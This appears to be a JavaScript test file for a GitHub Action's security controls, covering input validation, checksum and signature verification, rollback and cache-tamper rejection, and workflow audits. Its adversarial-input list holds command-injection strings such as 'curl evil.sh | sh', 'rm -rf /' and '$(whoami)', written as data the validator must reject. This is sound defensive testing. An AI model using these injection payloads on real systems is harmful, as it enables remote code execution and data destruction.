"use strict";

const assert = require("assert");
const crypto = require("crypto");
const fs = require("fs");
const path = require("path");
const {
  MARKER,
  findExistingCommentId,
  resolvePullRequestNumber,
  upsertPrComment,
} = require("./comment-pr");
const { validateActionInputs } = require("./validate-inputs");
const {
  validateVersionTag,
  verifyArchiveChecksum,
  expectedCertificateIdentity,
  checkVersionRollback,
  verifyPublisherSignature,
  verifyCachedBinary,
  ensureBinary,
} = require("../../npm/bin/arc");

async function run() {
  assert.strictEqual(resolvePullRequestNumber({ pull_request: { number: 42 } }), 42);
  assert.strictEqual(resolvePullRequestNumber({}), null);

  assert.strictEqual(
    findExistingCommentId([
      { id: 1, body: "unrelated" },
      { id: 99, body: `${MARKER}\n## report` },
    ]),
    99
  );
  assert.strictEqual(findExistingCommentId([{ id: 1, body: "other" }]), null);

  // Test update path when existing comment is found
  let calls = [];
  const resUpdate = await upsertPrComment({
    token: "tok",
    repo: "org/repo",
    prNumber: 7,
    markdown: `${MARKER}\nupdated`,
    requestFn: async (method, pathUrl, _tok, body) => {
      calls.push({ method, path: pathUrl, body });
      if (method === "GET") {
        return { status: 200, body: [{ id: 55, body: `${MARKER}\nold` }] };
      }
      return { status: 200, body: { id: 55 } };
    },
  });
  assert.strictEqual(resUpdate.updated, true);
  assert.strictEqual(calls[1].method, "PATCH");
  assert.strictEqual(calls[1].path, "/repos/org/repo/issues/comments/55");

  // Test create path when no existing comment is found
  calls = [];
  const resCreate = await upsertPrComment({
    token: "tok",
    repo: "org/repo",
    prNumber: 8,
    markdown: `${MARKER}\nnew`,
    requestFn: async (method, pathUrl, _tok, body) => {
      calls.push({ method, path: pathUrl, body });
      if (method === "GET") return { status: 200, body: [] };
      return { status: 201, body: { id: 101 } };
    },
  });
  assert.strictEqual(resCreate.created, true);
  assert.strictEqual(calls[1].method, "POST");
  assert.strictEqual(calls[1].path, "/repos/org/repo/issues/8/comments");

  // ── Phase 0: Action Input Validation & Injection Regression Tests ──────────
  assert.strictEqual(
    validateActionInputs({
      INPUT_VERSION: "v1.2.4",
      INPUT_FAIL_ON: "high",
      INPUT_FAIL_ON_SECRETS: "true",
      INPUT_FAIL_ON_UNPINNED_MCP: "true",
      INPUT_RUN_SCA: "false",
      INPUT_RUN_POLICY_TEST: "true",
      INPUT_COMMENT_PR: "true",
      INPUT_PATH: "./crates/arc-cli",
    }),
    true
  );

  const adversarialPayloads = [
    { INPUT_VERSION: "v1.2.4; curl evil.sh | sh" },
    { INPUT_VERSION: "$(whoami)" },
    { INPUT_FAIL_ON: 'high" && id #' },
    { INPUT_FAIL_ON_SECRETS: "true; rm -rf /" },
    { INPUT_FAIL_ON_UNPINNED_MCP: "false && whoami" },
    { INPUT_RUN_SCA: "`id`" },
    { INPUT_PATH: "foo\nbar" },
  ];
  for (const bad of adversarialPayloads) {
    assert.throws(
      () => validateActionInputs(bad),
      /Invalid/,
      `Expected adversarial input to fail validation: ${JSON.stringify(bad)}`
    );
  }

  // Verify action.yml never interpolates ${{ inputs.* }} inside any `run:` block
  const actionYml = fs.readFileSync(
    path.join(__dirname, "..", "..", "action.yml"),
    "utf8"
  );
  const runBlocks = actionYml.split(/\n\s*run:\s*\|/);
  for (let i = 1; i < runBlocks.length; i++) {
    const block = runBlocks[i].split(/\n\s*- name:/)[0];
    assert.strictEqual(
      /\$\{\{\s*inputs\./.test(block),
      false,
      "action.yml must not interpolate ${{ inputs.* }} directly inside a run: block"
    );
  }

  // ── Phase 0: Artifact Integrity Fail-Closed Regression Tests ───────────────
  assert.strictEqual(validateVersionTag("v1.2.4"), "v1.2.4");
  assert.throws(() => validateVersionTag("v1.2.4' ; iex 'evil'"), /Invalid/);
  assert.throws(() => validateVersionTag("../v1.2.4"), /Invalid/);

  const sampleBuf = Buffer.from("vexa-arc-release-archive-bytes", "utf8");
  const sampleSha = crypto.createHash("sha256").update(sampleBuf).digest("hex");
  const archiveName = "vexa-arc-v1.2.4-linux-x86_64.zip";

  assert.strictEqual(
    verifyArchiveChecksum(
      archiveName,
      sampleBuf,
      `# SHA-256 Digests\n${sampleSha}  ${archiveName}\n`
    ),
    sampleSha
  );

  // Missing checksum entry must fail closed
  assert.throws(
    () =>
      verifyArchiveChecksum(
        archiveName,
        sampleBuf,
        `# SHA-256 Digests\n${sampleSha}  other-file.zip\n`
      ),
    /No valid SHA-256 checksum entry/
  );

  // Empty checksums.txt must fail closed
  assert.throws(
    () => verifyArchiveChecksum(archiveName, sampleBuf, ""),
    /Missing or empty checksums\.txt/
  );

  // Tampered archive bytes must fail closed
  assert.throws(
    () =>
      verifyArchiveChecksum(
        archiveName,
        Buffer.from("tampered-bytes", "utf8"),
        `${sampleSha}  ${archiveName}\n`
      ),
    /SHA-256 mismatch/
  );

  // ── P1: Mandatory Publisher Signature, Provenance & Rollback Tests ─────────
  assert.strictEqual(
    expectedCertificateIdentity("v1.4.1"),
    "https://github.com/noviqtechnologies/vexa-arc/.github/workflows/release.yml@refs/tags/v1.4.1"
  );

  // Version rollback must be rejected by default
  assert.throws(
    () => checkVersionRollback("v1.4.0", "v1.4.1"),
    /Rollback rejected/
  );
  assert.strictEqual(checkVersionRollback("v1.4.2", "v1.4.1"), true);
  assert.strictEqual(checkVersionRollback("v1.4.1", "v1.4.1"), true);

  const tmpDir = fs.mkdtempSync(path.join(require("os").tmpdir(), "arc-sig-test-"));
  const tmpChecksums = path.join(tmpDir, "checksums.txt");
  const tmpBundle = path.join(tmpDir, "checksums.txt.bundle");
  const tmpArchive = path.join(tmpDir, archiveName);
  fs.writeFileSync(tmpChecksums, `${sampleSha}  ${archiveName}\n`);
  fs.writeFileSync(tmpArchive, sampleBuf);

  try {
    // 1. Missing signature bundle must fail closed when cosign is present
    assert.throws(
      () =>
        verifyPublisherSignature({
          checksumsPath: tmpChecksums,
          bundlePath: tmpBundle, // does not exist yet
          archivePath: tmpArchive,
          tag: "v1.4.1",
          spawnFn: (cmd, args) => {
            if (cmd === "cosign" && args[0] === "version") return { status: 0 };
            return { status: 1, stderr: "unexpected" };
          },
        }),
      /Missing or empty signature bundle/
    );

    fs.writeFileSync(tmpBundle, "{\"mediaType\":\"application/vnd.dev.sigstore.bundle.v0.3+json\"}");

    // 2. Wrong signer / tampered bundle / wrong workflow (cosign returns non-zero) must fail closed
    assert.throws(
      () =>
        verifyPublisherSignature({
          checksumsPath: tmpChecksums,
          bundlePath: tmpBundle,
          archivePath: tmpArchive,
          tag: "v1.4.1",
          spawnFn: (cmd, args) => {
            if (cmd === "cosign" && args[0] === "version") return { status: 0 };
            return { status: 1, stderr: "certificate identity mismatch" };
          },
        }),
      /Cosign publisher signature verification failed/
    );

    // 3. Valid cosign verification must pin exact tag identity and GitHub OIDC issuer
    let cosignArgs = null;
    const cosignOk = verifyPublisherSignature({
      checksumsPath: tmpChecksums,
      bundlePath: tmpBundle,
      archivePath: tmpArchive,
      tag: "v1.4.1",
      spawnFn: (cmd, args) => {
        if (cmd === "cosign" && args[0] === "version") return { status: 0 };
        cosignArgs = args;
        return { status: 0, stdout: "Verified OK" };
      },
    });
    assert.strictEqual(cosignOk.verifier, "cosign");
    assert.ok(
      cosignArgs.includes(
        "https://github.com/noviqtechnologies/vexa-arc/.github/workflows/release.yml@refs/tags/v1.4.1"
      ),
      "cosign must pin exact release workflow + tag identity"
    );
    assert.ok(
      cosignArgs.includes("https://token.actions.githubusercontent.com"),
      "cosign must pin GitHub Actions OIDC issuer"
    );

    // 4. When cosign is missing, fallback to `gh attestation verify` with pinned workflow & source-ref
    let ghArgs = null;
    const ghOk = verifyPublisherSignature({
      checksumsPath: tmpChecksums,
      bundlePath: tmpBundle,
      archivePath: tmpArchive,
      tag: "v1.4.1",
      spawnFn: (cmd, args) => {
        if (cmd === "cosign") return { error: new Error("ENOENT"), status: null };
        if (cmd === "gh" && args[0] === "--version") return { status: 0 };
        ghArgs = args;
        return { status: 0 };
      },
    });
    assert.strictEqual(ghOk.verifier, "gh-attestation");
    assert.ok(ghArgs.includes("--signer-workflow"));
    assert.ok(ghArgs.includes("refs/tags/v1.4.1"));

    // 5. Zero-dependency native Ed25519 verification passes with valid key/sig and rejects tampered sig or wrong key
    const { publicKey: edPub, privateKey: edPriv } = crypto.generateKeyPairSync("ed25519");
    const edPubPem = edPub.export({ type: "spki", format: "pem" }).toString();
    const { publicKey: wrongPub } = crypto.generateKeyPairSync("ed25519");
    const wrongPubPem = wrongPub.export({ type: "spki", format: "pem" }).toString();
    const tmpEdSig = path.join(tmpDir, "checksums.txt.ed25519.sig");
    const validSig = crypto.sign(null, fs.readFileSync(tmpChecksums), edPriv);
    fs.writeFileSync(tmpEdSig, validSig);

    const edOk = verifyPublisherSignature({
      checksumsPath: tmpChecksums,
      bundlePath: null,
      ed25519SigPath: tmpEdSig,
      archivePath: tmpArchive,
      tag: "v1.4.1",
      publicKeyPem: edPubPem,
      spawnFn: () => ({ error: new Error("ENOENT"), status: null }),
    });
    assert.strictEqual(edOk.verifier, "ed25519-native");

    // Wrong Ed25519 public key must fail closed
    assert.throws(
      () =>
        verifyPublisherSignature({
          checksumsPath: tmpChecksums,
          bundlePath: null,
          ed25519SigPath: tmpEdSig,
          archivePath: tmpArchive,
          tag: "v1.4.1",
          publicKeyPem: wrongPubPem,
          spawnFn: () => ({ error: new Error("ENOENT"), status: null }),
        }),
      /Ed25519 release signature verification failed/
    );

    // 6. Malformed/forged Sigstore bundle must fail closed via built-in native Sigstore verifier
    assert.throws(
      () =>
        verifyPublisherSignature({
          checksumsPath: tmpChecksums,
          bundlePath: tmpBundle,
          archivePath: tmpArchive,
          tag: "v1.4.1",
          spawnFn: () => ({ error: new Error("ENOENT"), status: null }),
        }),
      /Native Sigstore bundle verification failed/
    );

    // 6b. Native Sigstore verifier succeeds when cosign and gh are absent and pins exact identity + issuer
    let nativeSigArgs = null;
    const nativeSigOk = verifyPublisherSignature({
      checksumsPath: tmpChecksums,
      bundlePath: tmpBundle,
      archivePath: tmpArchive,
      tag: "v1.4.1",
      spawnFn: () => ({ error: new Error("ENOENT"), status: null }),
      nativeSigstoreVerifyFn: (args) => {
        nativeSigArgs = args;
        return { verifier: "sigstore-native", identity: args.certIdentity };
      },
    });
    assert.strictEqual(nativeSigOk.verifier, "sigstore-native");
    assert.strictEqual(
      nativeSigArgs.certIdentity,
      "https://github.com/noviqtechnologies/vexa-arc/.github/workflows/release.yml@refs/tags/v1.4.1"
    );
    assert.strictEqual(
      nativeSigArgs.oidcIssuer,
      "https://token.actions.githubusercontent.com"
    );

    // 6c. Missing bundle and neither cosign, gh, nor pinned Ed25519 key available must fail closed
    assert.throws(
      () =>
        verifyPublisherSignature({
          checksumsPath: tmpChecksums,
          bundlePath: null,
          archivePath: tmpArchive,
          tag: "v1.4.1",
          spawnFn: () => ({ error: new Error("ENOENT"), status: null }),
        }),
      /Mandatory publisher signature verification requires/
    );

    // 6d. Unauthenticated `gh` falls through to built-in native Sigstore when bundle is present
    const ghUnauthToSigstore = verifyPublisherSignature({
      checksumsPath: tmpChecksums,
      bundlePath: tmpBundle,
      archivePath: tmpArchive,
      tag: "v1.4.1",
      spawnFn: (cmd, args) => {
        if (cmd === "cosign") return { error: new Error("ENOENT"), status: null };
        if (cmd === "gh" && args[0] === "--version") return { status: 0 };
        return {
          status: 1,
          stderr: "To get started with GitHub CLI, please run: gh auth login",
        };
      },
      nativeSigstoreVerifyFn: (args) => ({
        verifier: "sigstore-native",
        identity: args.certIdentity,
      }),
    });
    assert.strictEqual(ghUnauthToSigstore.verifier, "sigstore-native");

    // 6e. Bundled Sigstore trusted root JSON exists and is valid
    const trustedRootPath = path.join(
      __dirname,
      "..",
      "..",
      "npm",
      "lib",
      "sigstore-trusted-root.json"
    );
    assert.ok(fs.existsSync(trustedRootPath), "npm/lib/sigstore-trusted-root.json must exist");
    const trustedRootJson = JSON.parse(fs.readFileSync(trustedRootPath, "utf8"));
    assert.ok(
      Array.isArray(trustedRootJson.certificateAuthorities) &&
        trustedRootJson.certificateAuthorities.length > 0,
      "Bundled Sigstore trusted root must contain Fulcio CAs"
    );
    assert.ok(
      Array.isArray(trustedRootJson.tlogs) && trustedRootJson.tlogs.length > 0,
      "Bundled Sigstore trusted root must contain Rekor tlogs"
    );

    // 7. Unauthenticated `gh` falls through to Ed25519 when a pinned key is configured,
    //    while actual attestation mismatch still fails closed immediately
    const ghUnauthFallback = verifyPublisherSignature({
      checksumsPath: tmpChecksums,
      bundlePath: null,
      ed25519SigPath: tmpEdSig,
      archivePath: tmpArchive,
      tag: "v1.4.1",
      publicKeyPem: edPubPem,
      spawnFn: (cmd, args) => {
        if (cmd === "cosign") return { error: new Error("ENOENT"), status: null };
        if (cmd === "gh" && args[0] === "--version") return { status: 0 };
        return {
          status: 1,
          stderr: "To get started with GitHub CLI, please run: gh auth login",
        };
      },
    });
    assert.strictEqual(ghUnauthFallback.verifier, "ed25519-native");

    assert.throws(
      () =>
        verifyPublisherSignature({
          checksumsPath: tmpChecksums,
          bundlePath: null,
          ed25519SigPath: tmpEdSig,
          archivePath: tmpArchive,
          tag: "v1.4.1",
          publicKeyPem: edPubPem,
          spawnFn: (cmd, args) => {
            if (cmd === "cosign") return { error: new Error("ENOENT"), status: null };
            if (cmd === "gh" && args[0] === "--version") return { status: 0 };
            return { status: 1, stderr: "attestation verification failed: signer mismatch" };
          },
        }),
      /GitHub SLSA provenance attestation verification failed/
    );

    // 8. End-to-end ensureBinary(): download -> verify -> cache hash -> cache hit -> tamper rejection -> rollback rejection
    const cacheRoot = path.join(tmpDir, "arc-cache-root");
    let downloadCalls = 0;
    const binName = process.platform === "win32" ? "arc.exe" : "arc";
    const platformTarget = { target: "linux-x86_64", bin: binName };
    const makeDownloads = (ver) => {
      const archName = `vexa-arc-${ver}-${platformTarget.target}.zip`;
      const archBytes = Buffer.from(`archive-for-${ver}`, "utf8");
      const sha = crypto.createHash("sha256").update(archBytes).digest("hex");
      const checksums = Buffer.from(`# SHA-256 Digests\n${sha}  ${archName}\n`, "utf8");
      return async (url) => {
        downloadCalls += 1;
        if (url.endsWith(archName)) return archBytes;
        if (url.endsWith("/checksums.txt")) return checksums;
        if (url.endsWith("/checksums.txt.bundle")) return Buffer.from("{}", "utf8");
        throw new Error(`HTTP 404 fetching ${url}`);
      };
    };
    const fakeExtract = (_zipPath, destDir, bin) => {
      const outDir = path.join(destDir, "bin");
      fs.mkdirSync(outDir, { recursive: true });
      const outBin = path.join(outDir, bin);
      fs.writeFileSync(outBin, "verified-arc-binary-bytes", "utf8");
      return outBin;
    };

    const installedV142 = await ensureBinary({
      version: "v1.4.2",
      platformTarget,
      cacheRoot,
      downloadFn: makeDownloads("v1.4.2"),
      verifyPublisherSignatureFn: () => ({ verifier: "mock-cosign" }),
      extractFn: fakeExtract,
    });
    assert.ok(fs.existsSync(installedV142));
    assert.ok(fs.existsSync(`${installedV142}.sha256`));
    const callsAfterFirst = downloadCalls;

    // Second call hits verified cache without re-downloading
    const cachedHit = await ensureBinary({
      version: "v1.4.2",
      platformTarget,
      cacheRoot,
      downloadFn: makeDownloads("v1.4.2"),
      verifyPublisherSignatureFn: () => ({ verifier: "mock-cosign" }),
      extractFn: fakeExtract,
    });
    assert.strictEqual(cachedHit, installedV142);
    assert.strictEqual(downloadCalls, callsAfterFirst, "Cache hit must not re-download");

    // Silent downgrade to v1.4.1 must be rejected by ensureBinary()
    await assert.rejects(
      () =>
        ensureBinary({
          version: "v1.4.1",
          platformTarget,
          cacheRoot,
          allowDowngrade: false,
          downloadFn: makeDownloads("v1.4.1"),
          verifyPublisherSignatureFn: () => ({ verifier: "mock-cosign" }),
          extractFn: fakeExtract,
        }),
      /Rollback rejected/
    );

    // Explicit allowDowngrade permits installing v1.4.1
    const downgraded = await ensureBinary({
      version: "v1.4.1",
      platformTarget,
      cacheRoot,
      allowDowngrade: true,
      downloadFn: makeDownloads("v1.4.1"),
      verifyPublisherSignatureFn: () => ({ verifier: "mock-cosign" }),
      extractFn: fakeExtract,
    });
    assert.ok(fs.existsSync(downgraded));

    // Tampering with cached binary must fail closed on next invocation
    fs.writeFileSync(installedV142, "tampered-binary-bytes", "utf8");
    assert.throws(() => verifyCachedBinary(installedV142), /Cached binary SHA-256 mismatch/);
    await assert.rejects(
      () =>
        ensureBinary({
          version: "v1.4.2",
          platformTarget,
          cacheRoot,
          downloadFn: makeDownloads("v1.4.2"),
          verifyPublisherSignatureFn: () => ({ verifier: "mock-cosign" }),
          extractFn: fakeExtract,
        }),
      /Cached binary SHA-256 mismatch/
    );

    // Missing sidecar digest must also fail closed
    fs.unlinkSync(`${installedV142}.sha256`);
    assert.throws(() => verifyCachedBinary(installedV142), /Cached binary integrity digest missing/);
  } finally {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  }

  // Static audit of install.sh, install.ps1, and release.yml immutability
  const installSh = fs.readFileSync(path.join(__dirname, "..", "..", "install.sh"), "utf8");
  const installPs1 = fs.readFileSync(path.join(__dirname, "..", "..", "install.ps1"), "utf8");
  const releaseYml = fs.readFileSync(
    path.join(__dirname, "..", "..", ".github", "workflows", "release.yml"),
    "utf8"
  );
  assert.strictEqual(installSh.includes("ARC_SKIP_COSIGN"), false, "install.sh must not allow silent cosign skip");
  assert.ok(installSh.includes("@refs/tags/${TAG}"), "install.sh must pin exact release tag identity");
  assert.ok(installPs1.includes("@refs/tags/$Tag"), "install.ps1 must pin exact release tag identity");
  assert.ok(installPs1.includes("cosign") && installPs1.includes("attestation verify"), "install.ps1 must enforce signature/provenance verification");
  assert.strictEqual(/^\s*overwrite:\s*true\b/m.test(releaseYml), false, "release.yml must not overwrite published releases");
  assert.strictEqual(/^\s*if:.*\bsecrets\./m.test(releaseYml), false, "release.yml must not reference secrets.* directly in step if: expressions");

  // Static security & portability audit of vexa-sca.yml
  const vexaScaYml = fs.readFileSync(
    path.join(__dirname, "..", "..", ".github", "workflows", "vexa-sca.yml"),
    "utf8"
  );
  assert.ok(vexaScaYml.includes("contents: read"), "vexa-sca.yml must declare least-privilege contents: read");
  assert.ok(vexaScaYml.includes("security-events: write"), "vexa-sca.yml must declare security-events: write for SARIF upload");
  assert.ok(vexaScaYml.includes("Cargo.toml"), "vexa-sca.yml must resolve vexa-sca tag dynamically from Cargo.toml");
  assert.strictEqual(vexaScaYml.includes("sudo "), false, "vexa-sca.yml must not depend on sudo for cross-OS portability");
  assert.strictEqual(vexaScaYml.includes("/tmp/vexa-sca"), false, "vexa-sca.yml must use runner.temp instead of hardcoded /tmp");
  assert.ok(vexaScaYml.includes("--ignore-unfixed"), "vexa-sca.yml must gate on actionable fixed CVEs");
  assert.ok(vexaScaYml.includes("--sast") && vexaScaYml.includes("--secrets"), "vexa-sca.yml must run separated SAST and Secrets gate");
  assert.ok(vexaScaYml.includes("github/codeql-action/upload-sarif@"), "vexa-sca.yml must upload SARIF to GitHub Code Scanning");
  assert.ok(vexaScaYml.includes("--sbom cyclonedx"), "vexa-sca.yml must generate a CycloneDX SBOM");
  const usesLines = vexaScaYml.match(/^\s*uses:\s*([^\s#]+)/gm) || [];
  assert.ok(usesLines.length >= 5, "vexa-sca.yml must declare expected workflow actions");
  for (const line of usesLines) {
    const ref = line.replace(/^\s*uses:\s*/, "").trim();
    assert.match(
      ref,
      /^[A-Za-z0-9_.-]+\/[A-Za-z0-9_.-]+(?:\/[A-Za-z0-9_.-]+)?@[0-9a-f]{40}$/,
      `All third-party actions in vexa-sca.yml must be pinned to a 40-char commit SHA: ${ref}`
    );
  }

  console.log("comment-pr.test.js: all assertions (including Phase 0, P1 installer & SCA workflow security gates) passed");
}

run().catch((err) => {
  console.error(err);
  process.exit(1);
});
